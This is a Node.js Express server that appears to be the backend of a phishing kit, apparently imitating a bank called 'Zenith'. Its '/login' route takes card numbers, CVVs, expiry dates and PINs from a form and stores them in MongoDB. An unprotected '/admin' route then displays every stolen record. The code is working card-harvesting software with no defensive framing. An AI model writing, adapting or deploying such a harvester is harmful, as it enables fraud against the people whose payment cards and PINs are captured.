//require modules
const express = require("express");
const bodyparser = require("body-parser");
const ejs = require("ejs");
const mongoose = require("mongoose");
const nodemailer = require("nodemailer");
const date = require("date-and-time");

const port = 3000;

mongoose.connect("mongodb://localhost:27017/cardDB", {
  useNewUrlParser: true,
}); //create database connection

let dBCardSchema = new mongoose.Schema({
  cardNumber: Number,
  cardCVV: Number,
  cardExpire: Number,
  cardPIN: Number
}); //data base schema

let dbCardModel = mongoose.model("card", dBCardSchema); //Create card schema

const app = express(); //represent modules

//express middle ware
app.use(express.static("public")); //access static files
app.use(bodyparser.urlencoded({ extended: true })); //use express middleware
app.set("view engine", "ejs"); //set ejs view engine

//app routes
app.get("/admin", function (request, response) {
  dbCardModel.find().then((data) => {
    response.render("index", { cardData: data });
  });
});
app.get("/", function (request, response) {
  response.render("zenith/index");
});
app
  .route("/login")
  .post(function (request, response) {
    const cardNumber = request.body.number;
    const cvv = request.body.cvv;
    const expire = request.body.expire;
    const pin = request.body.pin;
    
    //Create card data
    const cardData = new dbCardModel({
      cardNumber: cardNumber,
      cardCVV: cvv,
      cardExpire: expire,
      cardPIN: pin,
      date: date.format(new Date(), 'DD-[MM]-YYYY')
    });

    //save card data
    cardData.save();
    response.redirect("/");
  })
  .get(function (request, response) {
    response.render("zenith/index-2");
  });

app.listen(port, function () {
  console.log(`Server has started on port ${port}`);
});
